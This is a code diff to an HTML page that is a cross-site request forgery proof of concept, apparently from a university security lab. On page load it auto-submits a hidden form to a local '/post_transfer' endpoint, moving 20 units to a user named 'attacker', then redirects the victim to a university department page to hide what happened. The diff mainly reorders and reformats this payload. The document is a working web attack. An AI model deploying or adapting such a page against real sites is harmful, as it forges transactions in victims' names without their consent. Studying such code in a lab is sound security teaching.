@@ -9,22 +9,20 @@
         function submitForm() {
             document.getElementById("csrfForm").submit();
         }
-        window.onload = submitForm;
-    </script>
-</head>
-<body>
-    <form id = "csrfForm" action="http://localhost:3000/post_transfer" method="post">
-        <input type="hidden" name="destination_username" value="attacker">
-        <input type="hidden" name="quantity" value="20">
-    </form>
-    <script>
         window.onload = function() {
             submitForm();
             setTimeout(function(){
-            window.location.href = "https://eecs.utk.edu/";
-        }, 1000);
+                window.location.href = "https://eecs.utk.edu/";
+            }, 1000);
         }
     </script>
+</head>
+<body>
+    <form id="csrfForm" action="http://localhost:3000/post_transfer" method="post">
+        <input type="hidden" name="destination_username" value="attacker">
+        <input type="hidden" name="quantity" value="20">
+    </form>
 </body>
 </html>
+
 
